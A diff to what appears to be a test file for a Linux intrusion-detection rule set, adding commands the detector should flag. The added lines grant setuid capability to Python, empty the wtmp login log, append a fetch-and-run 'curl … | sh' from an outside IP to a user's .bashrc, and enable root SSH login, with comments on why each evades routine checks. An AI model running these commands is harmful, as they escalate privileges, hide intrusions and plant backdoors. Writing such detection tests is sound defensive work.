@@ -393,6 +393,19 @@ LINUX_COMMANDS_THAT_SHOULD_FIRE = [
     ("auditctl-flush", "auditctl -D"),
     ("setenforce-permissive", "setenforce 0"),
     ("suid-shell", "chmod u+s /tmp/bash"),
+    # The quieter sibling of the suid bit: nothing about the file's mode looks
+    # unusual, and `getcap -r /` is in almost nobody's routine.
+    ("setcap-setuid", "setcap cap_setuid+ep /usr/bin/python3.11"),
+    # Truncation rather than deletion. A missing log is noticed; a log that
+    # still exists and is empty usually is not.
+    ("wtmp-truncated", "truncate -s 0 /var/log/wtmp"),
+    # Persistence nowhere near cron, systemd or rc.local, which is where a
+    # check looks.
+    ("bashrc-appended",
+     "sh -c \"echo 'curl -s http://185.7.2.9/x | sh' >> /home/deploy/.bashrc\""),
+    # The daemon itself becomes the backdoor - no new binary, no new service.
+    ("sshd-permitrootlogin",
+     "sh -c \"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config\""),
 ]
 
 LINUX_COMMANDS_THAT_MUST_NOT = [
